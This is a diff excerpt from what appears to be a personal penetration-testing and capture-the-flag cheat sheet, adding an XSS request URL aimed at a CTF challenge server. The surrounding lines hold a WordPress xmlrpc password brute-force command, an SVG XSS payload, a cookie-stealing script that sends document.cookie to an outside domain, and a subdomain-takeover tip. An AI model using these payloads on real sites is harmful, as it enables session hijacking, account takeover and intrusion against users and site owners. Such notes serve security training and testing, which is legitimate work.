@@ -31,6 +31,8 @@ xmlrpc -P /usr/share/wordlists/fasttrack.txt -o wpscan.txt
 ##XSS
 SVG - No spaces----<svg/OnLoad="`${prompt``}`">
 Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
+XSS Web Request----
+http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
 
 ##Cloud
 Domain Hijacking----Have 404s pointing to a S3 bucket?  Take over the subdomain!
